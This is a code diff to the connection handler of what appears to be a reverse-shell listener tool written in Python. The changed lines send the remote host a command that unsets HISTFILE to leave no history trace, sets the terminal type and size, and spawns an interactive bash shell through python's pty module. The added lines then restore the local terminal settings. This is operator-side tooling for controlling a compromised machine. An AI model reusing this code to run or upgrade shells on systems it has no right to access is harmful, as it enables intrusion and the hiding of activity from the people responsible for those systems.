@@ -154,8 +154,14 @@ def listener_handler(conn):
                 tty_val = subprocess.check_output(shlex.split('stty -a')).split(b';')
                 rows = int(tty_val[1].split()[-1])
                 columns = int(tty_val[2].split()[-1])
-                send_data = f"stty raw -echo; (echo unset HISTFILE; echo export TERM={os.environ['TERM']}; echo stty rows {rows} columns {columns}; echo reset; cat) | python -c 'import pty; pty.spawn(\"/bin/bash\");exit()'\n".encode()
-            conn.sendall(send_data)
+                send_data = "(echo unset HISTFILE; " \
+                            f"echo export TERM={os.environ['TERM']}; " \
+                            f"echo stty rows {rows} columns {columns}; " \
+                             "echo reset; cat) | python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+                # subprocess.check_output(shlex.split('stty raw -echo'))
+                conn.sendall(send_data.encode())
+            else:
+                conn.sendall(send_data)
             if send_data == b'exit\n':
                 break
         else:
@@ -163,3 +169,6 @@ def listener_handler(conn):
         sys.stdout.write(recv_timeout(conn, send_data))
         sys.stdout.flush()
     conn.close()
+    if orig_tty:
+        subprocess.check_output(shlex.split(f'stty {orig_tty.decode()}'))
+
